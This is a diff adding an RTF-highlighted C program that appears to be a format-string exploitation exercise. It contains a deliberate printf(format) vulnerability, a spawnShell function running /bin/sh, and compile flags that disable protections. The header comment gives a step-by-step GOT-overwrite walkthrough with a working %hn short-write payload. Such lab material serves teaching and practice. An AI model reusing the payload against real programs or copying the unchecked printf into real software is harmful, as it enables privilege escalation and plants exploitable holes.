@@ -1,0 +1,65 @@
+{\rtf1\ansi\deff0{\fonttbl{\f0\fmodern\fprq1\fcharset0;}}{\colortbl;\red136\green136\blue136;\red186\green33\blue33;\red0\green68\blue221;\red102\green102\blue102;\red64\green128\blue128;\red160\green160\blue0;\red25\green23\blue124;\red0\green128\blue0;\red187\green102\blue136;\red187\green102\blue34;\red136\green0\blue0;\red170\green34\blue255;\red153\green153\blue153;\red0\green160\blue0;\red160\green0\blue0;\red255\green0\blue0;\red128\green0\blue128;\red176\green0\blue64;\red0\green0\blue255;\red187\green187\blue187;\red188\green122\blue0;\red0\green0\blue128;\red125\green144\blue41;\red210\green65\blue58;}\f0{\cf5\i /* Overwriting eip \par
+ * gcc -g -O0 -fno-stack-protector -Wno-format-security -z execstack -Wl,-z,norelro -o format3 format3.c\par
+ * ./format4 $(printf "\\x41\\x41\\x41\\x41\\x42\\x42\\x42\\x42")%15\\$p%16\\$p\par
+ * Exploit (multibyte):\par
+ * ==============\par
+ * 1. Find the address of the function to call: nm ./format3 -> 080484e1 T spawnShell\par
+ * 2. Find the address in the got to overwrite: objdump -R ./format3 -> 080498f8 R_386_JUMP_SLOT   printf\par
+ * 3. Find the format string on the stack: ./format3 $(printf "AAAABBBBCCCCDDDD")%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\par
+ * 4. So the A's are 15, B's are 16, C's 17, D's are 18\par
+ * 5. Double check the alignment ./format3 $(printf "AAAABBBBCCCCDDDD")%15\\$p%16\\$p%17\\$p%18\\$p\par
+ * 6. Use short writes to overwrite the address:\par
+	$(printf "\\xfa\\x98\\x04\\x08\\xf8\\x98\\x04\\x08")%2044x%15\\$hn%31965x%16\\$hn\par
+	- So the %15 param writes the last half of the address (84e1), and %16 writes the first part of the address (0804)\par
+ */}\par
+{\cf21 #}{\cf21 undef _FORTIFY_SOURCE}{\cf21 \par
+}{\cf21 #}{\cf21 include <stdio.h>}{\cf21 \par
+}{\cf21 #}{\cf21 include <unistd.h>}{\cf21 \par
+}{\cf21 #}{\cf21 include <string.h>}{\cf21 \par
+}\par
+{\cf18 void} {\cf19 be_nice_to_people}() \{\par
+    {\cf5\i // /bin/sh is usually symlinked to bash, which usually drops privs. Make\par
+}    {\cf5\i // sure we don't drop privs if we exec bash, (ie if we call system()).\par
+}    {\cf18 gid_t} gid {\cf4 =} getegid();\par
+    setresgid(gid, gid, gid);\par
+\}\par
+\par
+{\cf18 int} {\cf19 exit_nicely}({\cf18 char} {\cf4 *}msg)\par
+\{\par
+	printf({\cf2 "}{\cf10\b \\n}{\cf2 %s}{\cf10\b \\n}{\cf2 "}, msg);\par
+	{\cf8\b return}({\cf4 0});\par
+\}\par
+\par
+{\cf18 int} {\cf19 vulnerable_function}({\cf18 char} {\cf4 *}format)\par
+\{\par
+    printf(format);\par
+\}\par
+\par
+{\cf5\i //__attribute__((destructor(2))) int spawnShell()\par
+}{\cf18 int} {\cf19 spawnShell}()\par
+\{\par
+        printf({\cf2 "}{\cf10\b \\n}{\cf2 running sh...}{\cf10\b \\n}{\cf2 "});\par
+        system({\cf2 "}{\cf2 /bin/sh}{\cf2 "});\par
+	{\cf8\b return}({\cf4 1});\par
+\}\par
+\par
+{\cf18 int} {\cf19 main}({\cf18 int} argc, {\cf8\b const} {\cf18 char} {\cf4 *}{\cf4 *}argv) \{\par
+    be_nice_to_people();\par
+    {\cf18 char} buf[{\cf4 100}];\par
+\par
+    sleep({\cf4 100});\par
+  {\cf8\b if}(argc {\cf4 =}{\cf4 =} {\cf4 1}) \{\par
+    errx({\cf4 1}, {\cf2 "}{\cf2 please specify an argument}{\cf10\b \\n}{\cf2 "});\par
+  \}\par
+\par
+    memset(buf, {\cf2 '\\0'}, {\cf8\b sizeof}(buf));\par
+    memcpy(buf, argv[{\cf4 1}], {\cf8\b sizeof}(buf)); \par
+\par
+    {\cf5\i /* Call the vulnerable function */}\par
+    vulnerable_function(buf);\par
+\par
+    {\cf5\i /* Call the exit function */}\par
+    exit_nicely({\cf2 "}{\cf2 Exiting...}{\cf2 "}); \par
+    {\cf8\b return} {\cf4 0};\par
+\}\par
+}
